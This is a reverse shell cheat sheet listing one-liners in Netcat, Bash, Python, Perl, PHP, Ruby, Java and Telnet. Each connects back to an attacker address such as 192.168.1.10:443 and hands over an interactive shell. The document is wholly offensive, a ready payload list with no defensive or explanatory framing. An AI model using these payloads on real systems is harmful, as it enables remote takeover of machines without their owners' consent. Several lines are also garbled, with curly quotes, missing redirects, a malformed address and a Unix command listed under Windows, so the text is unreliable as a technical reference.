# Reverse Shell Cheat Sheet
***********
### Netcat:
nc 192.168.1.10 443 -e /bin/bash

/bin/sh | nc 192.168.1.10 443

rm -f /tmp/p; mknod /tmp/p p && nc 192.168.1.10 443 0/tmp/p

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip >/tmp/f

### Bash:
bash -i >& /dev/tcp/192.168.1.10/443 0>&1

/bin/bash -i > /dev/tcp/192.168.1.10/443 0<&1 2>&1

0<&196;exec 196<>/dev/tcp/192.168.1.10/443; sh <&196 >&196 2>&196

exec 5<>/dev/tcp/192.168.1.10/443
cat <&5 | while read line; do $line 2>&5 >&5; done

exec 5<>/dev/tcp/192.168.1.10/443
cat <&5 | while read line 0<&5; do $line 2>&5 >&5; done

### Python:
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.10”,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’

### Perl:
*nix:
perl -e ‘use Socket;$i=”192.168.1.10″;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’

### Windows:
perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”192.168.1.10-IP:443″);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’

perl -e ‘use Socket;$i=”192.168.1.10″;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’

### PHP:
php -r ‘$sock=fsockopen(“192.168.1.10”,443);exec(“/bin/sh -i <&3 >&3 2>&3”);’

### Ruby:
ruby -rsocket -e’f=TCPSocket.open(“192.168.1.10”,443).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’

### Windows
ruby -rsocket -e ‘c=TCPSocket.new(“attackerip”,”4444″);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’

### Java:
r = Runtime.getRuntime()
p = r.exec([“/bin/bash”,”-c”,”exec 5<>/dev/tcp/192.168.1.10/443;cat <&5 | while read line; do \$line 2>&5 >&5; done”] as String[])
p.waitFor()

### Telnet:
rm -f /tmp/p; mknod /tmp/p p && telnet 192.168.1.10 443 0/tmp/p

telnet 192.168.1.10 443 | /bin/bash | telnet 192.168.1.10 443
